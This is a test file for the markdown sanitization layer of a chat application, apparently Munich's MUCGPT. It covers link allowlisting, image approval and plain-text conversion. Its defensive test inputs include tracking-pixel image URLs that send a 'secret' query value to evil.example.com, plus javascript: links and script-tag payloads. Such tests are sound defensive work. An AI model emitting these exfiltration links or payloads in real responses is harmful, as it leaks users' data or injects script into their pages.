// @vitest-environment jsdom

import Markdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { act, fireEvent, render, screen } from "@testing-library/react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { ExternalLinkDialog } from "./ExternalLinkDialog";
import { classifyImageUrl, classifyUrl, markdownLinksToPlainText, safeMarkdownComponents, stripMarkdownLinks } from "./markdownLinkPolicy";
import {
    approveImageUrl,
    bindImageApprovals,
    configureImageApprovals,
    getApprovedImageUrls,
    rejectImageUrl,
    resumeImageApprovals,
    suspendImageApprovals
} from "./imageApprovals";

vi.mock("react-i18next", () => ({
    useTranslation: () => ({ t: (key: string) => key })
}));

const putApprovedImagesMock = vi.hoisted(() => vi.fn());
vi.mock("../../api/conversations-client", () => ({
    putApprovedImagesApi: putApprovedImagesMock
}));

const renderMarkdown = (markdown: string): string =>
    renderToStaticMarkup(
        <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
            {markdown}
        </Markdown>
    );

const DOMAIN = "www.muenchen.de";

describe("classifyUrl", () => {
    it("keeps allowlisted hosts byte-for-byte including query strings", () => {
        const url = "https://www.muenchen.de/suche?q=1";
        expect(classifyUrl(url, [DOMAIN])).toEqual({ kind: "allowed", url });
    });

    it("does not allowlist subdomains, ports or userinfo", () => {
        for (const url of [
            "https://evil.www.muenchen.de/",
            "https://www.muenchen.de:8443/",
            "https://evil@www.muenchen.de/",
            "https://user:pass@www.muenchen.de/"
        ]) {
            expect(classifyUrl(url, [DOMAIN]).kind).toBe("sanitized");
        }
    });

    it("matches hostnames case-insensitively", () => {
        expect(classifyUrl("https://WWW.MUENCHEN.DE/", [DOMAIN]).kind).toBe("allowed");
    });

    it("strips query string, fragment and userinfo from other links but keeps them clickable", () => {
        expect(classifyUrl("https://evil.example.com/pixel?d=secret#frag", [])).toEqual({
            kind: "sanitized",
            url: "https://evil.example.com/pixel"
        });
        expect(classifyUrl("https://user:pass@evil.example.com/", [])).toEqual({
            kind: "sanitized",
            url: "https://evil.example.com/"
        });
    });

    it("keeps mailto links clickable after sanitization", () => {
        expect(classifyUrl("mailto:support@muenchen.de?subject=Hi", [])).toEqual({
            kind: "sanitized",
            url: "mailto:support@muenchen.de"
        });
    });

    it("blocks javascript, data and relative destinations", () => {
        for (const url of ["javascript:alert(1)", "data:text/html,x", "/relative/path", "../up", "not a url"]) {
            expect(classifyUrl(url, [DOMAIN]).kind).toBe("blocked");
        }
    });
});

describe("classifyImageUrl", () => {
    it("auto-loads allowlisted http(s) images", () => {
        expect(classifyImageUrl("https://www.muenchen.de/logo.png", [DOMAIN])).toEqual({
            kind: "allowed",
            url: "https://www.muenchen.de/logo.png"
        });
    });

    it("strips query strings from other image sources", () => {
        expect(classifyImageUrl("https://evil.example.com/pixel.png?d=secret", [])).toEqual({
            kind: "sanitized",
            url: "https://evil.example.com/pixel.png"
        });
    });

    it("never renders mailto or data images", () => {
        expect(classifyImageUrl("mailto:a@b.c", [DOMAIN]).kind).toBe("blocked");
        expect(classifyImageUrl("data:image/png;base64,AAAA", [DOMAIN]).kind).toBe("blocked");
    });
});

describe("markdownLinkPolicy", () => {
    beforeEach(() => {
        configureImageApprovals(null, []);
        putApprovedImagesMock.mockClear();
        putApprovedImagesMock.mockResolvedValue(undefined);
    });

    it("renders allowlisted links with the URL clickable", () => {
        const html = renderMarkdown("[MUCGPT](https://www.muenchen.de)");
        expect(html).toContain('(<a href="https://www.muenchen.de"');
        expect(html).toContain("MUCGPT");
        expect(html).toContain(">https://www.muenchen.de</a>)");
    });

    it("keeps full query strings only for allowlisted links", () => {
        const html = renderMarkdown("[Suche](https://www.muenchen.de/suche?q=1)");
        expect(html).toContain('href="https://www.muenchen.de/suche?q=1"');
    });

    it("renders other links clickable with sanitized URLs", () => {
        const html = renderMarkdown("[Extern](https://evil.example.com/page?d=secret)");
        expect(html).toContain('(<a href="https://evil.example.com/page"');
        expect(html).not.toContain("d=secret");
        expect(html).toContain(">https://evil.example.com/page</a>)");
    });

    it("renders blocked destinations as non-clickable text", () => {
        const html = renderMarkdown("[X](javascript:alert(1))");
        expect(html).not.toContain("<a");
        expect(html).not.toContain("href");
        expect(html).toContain("X");
    });

    it("does not duplicate the URL when the link text already is the URL", () => {
        const html = renderMarkdown("<https://mucgpt.example.com>");
        expect(html).toContain('<a href="https://mucgpt.example.com/"');
        expect(html.replace(/href="[^"]*"/g, "").match(/mucgpt\.example\.com/g)).toHaveLength(1);
    });

    it("renders unknown images as a placeholder with the sanitized URL", () => {
        const html = renderMarkdown("![tracking pixel](https://evil.example.com/pixel.png?d=secret)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("src=");
        expect(html).toContain("tracking pixel");
        expect(html).not.toContain("d=secret");
        expect(html).toContain("https://evil.example.com/pixel.png");
        expect(html).toContain("chat.image_show");
        expect(html).toContain("chat.image_hide");
    });

    it("falls back to the URL for images without alt text", () => {
        const html = renderMarkdown("![](https://evil.example.com/pixel.png)");
        expect(html).not.toContain("<img");
        expect(html).toContain("https://evil.example.com/pixel.png");
    });

    it("auto-loads allowlisted images", () => {
        const html = renderMarkdown("![Logo](https://www.muenchen.de/logo.png)");
        expect(html).toContain('<img src="https://www.muenchen.de/logo.png"');
    });

    it("renders approved images after user approval", () => {
        approveImageUrl("https://evil.example.com/pixel.png");
        const html = renderMarkdown("![pixel](https://evil.example.com/pixel.png?d=secret)");
        expect(html).toContain('<img src="https://evil.example.com/pixel.png"');
    });

    it("shows the URL and approval buttons directly in the placeholder", () => {
        render(
            <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
                ![pixel](https://evil.example.com/pixel.png?d=secret)
            </Markdown>
        );
        expect(screen.getByRole("group")).toBeTruthy();
        expect(screen.getByRole("button", { name: "chat.image_show" })).toBeTruthy();
        expect(screen.getByRole("button", { name: "chat.image_hide" })).toBeTruthy();
        expect(screen.getByText(/evil\.example\.com\/pixel\.png/)).toBeTruthy();
    });

    it("persists approve and reject decisions for the bound conversation", () => {
        configureImageApprovals("conv-1", [], []);
        act(() => {
            approveImageUrl("https://e.test/a.png");
        });
        expect(putApprovedImagesMock).toHaveBeenLastCalledWith("conv-1", ["https://e.test/a.png"], []);
        act(() => {
            rejectImageUrl("https://e.test/r.png");
        });
        expect(putApprovedImagesMock).toHaveBeenLastCalledWith("conv-1", ["https://e.test/a.png"], ["https://e.test/r.png"]);
    });

    it("skips persistence without a bound conversation and flushes when bound", () => {
        act(() => {
            approveImageUrl("https://e.test/pending.png");
        });
        expect(putApprovedImagesMock).not.toHaveBeenCalled();

        act(() => {
            bindImageApprovals("conv-2");
        });
        expect(putApprovedImagesMock).toHaveBeenLastCalledWith("conv-2", ["https://e.test/pending.png"], []);
    });

    it("restores the suspended approvals unless a newer configure happened while suspended", () => {
        configureImageApprovals("conv-1", ["https://approved.example.com/a.png"]);
        suspendImageApprovals();
        expect(getApprovedImageUrls()).toEqual([]);

        resumeImageApprovals();
        expect(getApprovedImageUrls()).toEqual(["https://approved.example.com/a.png"]);

        configureImageApprovals("conv-2", ["https://later.example.com/b.png"]);
        suspendImageApprovals();
        configureImageApprovals("conv-3", ["https://after.example.com/c.png"]);
        resumeImageApprovals();
        expect(getApprovedImageUrls()).toEqual(["https://after.example.com/c.png"]);
        configureImageApprovals(null, []);
    });

    it("approval renders the image and hides the ask buttons", () => {
        render(
            <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
                ![pixel](https://evil.example.com/pixel.png)
            </Markdown>
        );
        fireEvent.click(screen.getByRole("button", { name: "chat.image_show" }));
        expect(screen.getByRole("img")).toBeTruthy();
        expect(screen.queryByRole("button", { name: "chat.image_show" })).toBeNull();
        expect(screen.queryByRole("button", { name: "chat.image_hide" })).toBeNull();
    });

    it("rejection renders dead text without buttons", () => {
        act(() => {
            rejectImageUrl("https://evil.example.com/other.png");
        });
        const html = renderMarkdown("![pixel](https://evil.example.com/other.png)");
        expect(html).not.toContain("<img");
        expect(html).not.toContain("chat.image_show");
        expect(html).not.toContain("chat.image_hide");
        expect(html).toContain("https://evil.example.com/other.png");
    });

    it("renders a user-typed bare domain as one clickable link without appended URL", () => {
        const html = renderMarkdown("Siehe http://www.muenchen.de heute.");
        expect(html).toContain('<a href="https://www.muenchen.de"');
        expect((html.replace(/href="[^"]*"/g, "").match(/muenchen\.de/g) ?? []).length).toBe(1);
        expect(html).not.toContain("(http://");
    });

    it("renders a scheme-less bare allowlisted domain with an https href", () => {
        const html = renderMarkdown("Siehe www.muenchen.de heute.");
        expect(html).toContain('<a href="https://www.muenchen.de"');
        expect((html.replace(/href="[^"]*"/g, "").match(/muenchen\.de/g) ?? []).length).toBe(1);
    });

    it("renders a bare foreign domain as one clickable sanitized link", () => {
        const html = renderMarkdown("Siehe www.example.com/test?q=1 heute.");
        expect(html).toContain('<a href="http://www.example.com/test"');
        expect(html).not.toContain("(http://");
    });

    it("asks for confirmation when a sanitized link is activated", () => {
        render(
            <>
                <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
                    [Extern](https://evil.example.com/page)
                </Markdown>
                <ExternalLinkDialog />
            </>
        );
        fireEvent.click(screen.getByRole("link"));
        expect(screen.getByText("external_link.title")).toBeTruthy();
        fireEvent.click(screen.getByRole("button", { name: "external_link.cancel" }));
        expect(screen.queryByText("external_link.title")).toBeNull();
    });

    it("does not ask for confirmation for allowlisted links", () => {
        render(
            <>
                <Markdown remarkPlugins={[remarkGfm]} components={safeMarkdownComponents}>
                    [Stadt](https://www.muenchen.de)
                </Markdown>
                <ExternalLinkDialog />
            </>
        );
        fireEvent.click(screen.getByRole("link"));
        expect(screen.queryByText("external_link.title")).toBeNull();
    });

    it("keeps appending the URL for markdown links whose label is no URL", () => {
        const html = renderMarkdown("[Stadtplan](https://www.muenchen.de/karte)");
        expect(html).toContain("<a");
        expect(html).toContain('(<a href="https://www.muenchen.de/karte"');
    });

    it("keeps other markdown intact", () => {
        const html = renderMarkdown("# Title\n\n**bold** and `code`");
        expect(html).toContain("Title");
        expect(html).toContain("<strong>bold</strong>");
        expect(html).toContain("<code>code</code>");
    });
});

describe("stripMarkdownLinks", () => {
    it("unwraps inline links", () => {
        expect(stripMarkdownLinks("- [Node](https://evil.example.com)")).toBe("- Node");
    });

    it("drops images, keeping only their alt text", () => {
        expect(stripMarkdownLinks("topic ![tiny](https://evil.example.com/x.png) more")).toBe("topic tiny more");
    });

    it("unwraps reference-style links and drops their definitions", () => {
        const result = stripMarkdownLinks("A [B][ref] node\n\n[ref]: https://evil.example.com");
        expect(result).not.toContain("evil.example.com");
        expect(result).toContain("A B node");
    });

    it("unwraps autolinks", () => {
        expect(stripMarkdownLinks("<https://evil.example.com>")).toBe("https://evil.example.com");
    });

    it("leaves fenced and inline code untouched", () => {
        const markdown = "text [a](https://x.example.com)\n\n```\n[keep](https://code.example.com)\n```\n\ninline `[also kept](y)`";
        const result = stripMarkdownLinks(markdown);
        expect(result).toContain("[keep](https://code.example.com)");
        expect(result).toContain("`[also kept](y)`");
        expect(result).toContain("text a");
    });
});

describe("markdownLinksToPlainText", () => {
    it("breaks inline links down to the chat answer view", () => {
        expect(markdownLinksToPlainText("Siehe [Anleitung](https://muenchen.de).")).toBe("Siehe Anleitung (https://muenchen.de).");
    });

    it("does not duplicate the URL when the description already contains it", () => {
        expect(markdownLinksToPlainText("[https://muenchen.de](https://muenchen.de)")).toBe("https://muenchen.de");
    });

    it("drops link titles and uses the destination only", () => {
        expect(markdownLinksToPlainText('[Doku](https://muenchen.de "Titel")')).toBe("Doku (https://muenchen.de)");
    });

    it("keeps angle-wrapped destinations with spaces intact", () => {
        expect(markdownLinksToPlainText("[Formular](<https://muenchen.de/formular pfad>)")).toBe("Formular (https://muenchen.de/formular pfad)");
    });

    it("keeps one balanced paren level in the destination", () => {
        expect(markdownLinksToPlainText("[Artikel](https://de.wikipedia.org/wiki/Foo_(bar))")).toBe("Artikel (https://de.wikipedia.org/wiki/Foo_(bar))");
    });

    it("uses the destination when the description is empty", () => {
        expect(markdownLinksToPlainText("[](https://muenchen.de)")).toBe("https://muenchen.de");
    });

    it("breaks images down to alt (url)", () => {
        expect(markdownLinksToPlainText("![Diagramm](https://muenchen.de/d.png)")).toBe("Diagramm (https://muenchen.de/d.png)");
        expect(markdownLinksToPlainText("![](https://muenchen.de/d.png)")).toBe("https://muenchen.de/d.png");
    });

    it("unwraps autolinks", () => {
        expect(markdownLinksToPlainText("Besuch <https://muenchen.de> heute")).toBe("Besuch https://muenchen.de heute");
    });

    it("resolves reference links via their definitions", () => {
        const result = markdownLinksToPlainText(
            "Siehe [Anleitung][doc] und [Formular][form].\n\n[doc]: https://muenchen.de/doku\n[form]: https://muenchen.de/form"
        );
        expect(result).toBe("Siehe Anleitung (https://muenchen.de/doku) und Formular (https://muenchen.de/form).\n\n");
        expect(result).not.toContain("[doc]");
    });

    it("resolves collapsed references", () => {
        const result = markdownLinksToPlainText("Siehe [MUCGPT][]\n\n[MUCGPT]: https://mucgpt.example.com");
        expect(result).toBe("Siehe MUCGPT (https://mucgpt.example.com)\n\n");
    });

    it("keeps unknown reference labels as plain text", () => {
        expect(markdownLinksToPlainText("Siehe [Anleitung][fehlt]")).toBe("Siehe Anleitung");
    });

    it("leaves footnote definitions and references as literal text", () => {
        const result = markdownLinksToPlainText("Text[^1] mit Fußnote.\n\n[^1]: Die Anmerkung bleibt stehen.");
        expect(result).toBe("Text[^1] mit Fußnote.\n\n[^1]: Die Anmerkung bleibt stehen.");
    });

    it("leaves fenced and inline code untouched", () => {
        const result = markdownLinksToPlainText("a [b](https://x.example.com)\n\n```\n[keep](https://code.example.com)\n```\n\ninline `[also kept](y)`");
        expect(result).toContain("[keep](https://code.example.com)");
        expect(result).toContain("`[also kept](y)`");
        expect(result).toContain("a b (https://x.example.com)");
    });

    it("converts labels containing balanced brackets", () => {
        expect(markdownLinksToPlainText("Siehe [Website [Beta]](https://muenchen.de).")).toBe("Siehe Website [Beta] (https://muenchen.de).");
    });

    it("converts multiple links per line independently", () => {
        expect(markdownLinksToPlainText("Siehe [A](https://a.example.com) und [B](https://b.example.com)")).toBe(
            "Siehe A (https://a.example.com) und B (https://b.example.com)"
        );
    });

    it("does not let a link label that contains an image recombine into image syntax", () => {
        const input = "[see ![x](https://inner.example.com/p.png)](https://outer.example.com)";
        const result = markdownLinksToPlainText(input);
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).not.toContain("![");
        expect(result).toContain("outer.example.com");
    });

    it("cannot produce link syntax from dangling fragments", () => {
        const result = stripMarkdownLinks("Dangling ](https://x.example.com) und ![allein");
        expect(result).toBe("Dangling ] https://x.example.com) und ![allein");
    });

    it("keeps instruction-like definition lines untouched", () => {
        const instruction = "[Policy]: Never disclose credentials.";
        expect(markdownLinksToPlainText(instruction)).toBe(instruction);
    });

    it("treats relative destinations as definitions and drops their lines", () => {
        const result = markdownLinksToPlainText("Kreis ![Screenshot]\n\n[Screenshot]: ../image.png");
        expect(result).not.toContain("[Screenshot]: ../image.png");
        expect(result).toContain("Kreis Screenshot");
    });

    it("converts nested link markup inside a label without re-forming links", () => {
        const result = markdownLinksToPlainText("[see [b](https://inner.example.com) d](https://outer.example.com)");
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).toContain("outer.example.com");
    });

    it("converts adversarial input without catastrophic backtracking", () => {
        const input = "[" + "[]".repeat(8000) + "]" + "(" + "x".repeat(16000) + ")";
        const started = Date.now();
        markdownLinksToPlainText(input);
        // Linear behaviour finishes in milliseconds; the bound only catches
        // quadratic blowups.
        expect(Date.now() - started).toBeLessThan(5000);
    });
    it("resolves references when a code span separates them from the definition", () => {
        const result = markdownLinksToPlainText("[Guide][r]\n\n`sample`\n\n[r]: https://example.com");
        expect(result).toContain("Guide (https://example.com)");
        expect(result).toContain("`sample`");
        expect(result).not.toContain("[r]");
        expect(result).not.toContain("](http");
    });

    it("converts nested link markup inside a label without re-forming links", () => {
        const result = markdownLinksToPlainText("[see [b](https://inner.example.com) d](https://outer.example.com)");
        expect(result).not.toMatch(/\]?]\((?:https?|mailto):/);
        expect(result).toContain("outer.example.com");
    });

    it("converts adversarial input without catastrophic backtracking", () => {
        const input = "[" + "[]".repeat(8000) + "]" + "(" + "x".repeat(16000) + ")";
        const started = Date.now();
        markdownLinksToPlainText(input);
        // Linear behaviour finishes in milliseconds; the bound only catches
        // quadratic blowups.
        expect(Date.now() - started).toBeLessThan(5000);
    });
});

describe("stripMarkdownLinks hardening", () => {
    it("escapes raw html and element-like fragments that survive the transform", () => {
        const result = stripMarkdownLinks(
            '<script>alert(1)</script>\n- <img src="https://evil.example.com/pixel?d=secret">\n- <a href="https://evil.example.com">Link</a>'
        );
        expect(result).not.toContain("<script");
        expect(result).toContain("alert(1)");
        expect(result).toContain("Link");
    });

    it("neutralizes images with multiline destinations", () => {
        const result = stripMarkdownLinks("![pixel](\nhttps://evil.example.com/pixel?d=secret\n)");
        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
        expect(result).toContain("pixel");
    });

    it("neutralizes images whose label is split by a code span", () => {
        const result = stripMarkdownLinks("![pixel `x`](https://evil.example.com/pixel?d=secret)");
        expect(result).not.toMatch(/\]\((?:https?|mailto):/);
    });

    it("leaves fences untouched while hard-breaking leftover link syntax", () => {
        const result = stripMarkdownLinks("```\n[keep](https://code.example.com)\n```");
        expect(result).toBe("```\n[keep](https://code.example.com)\n```");
    });
});
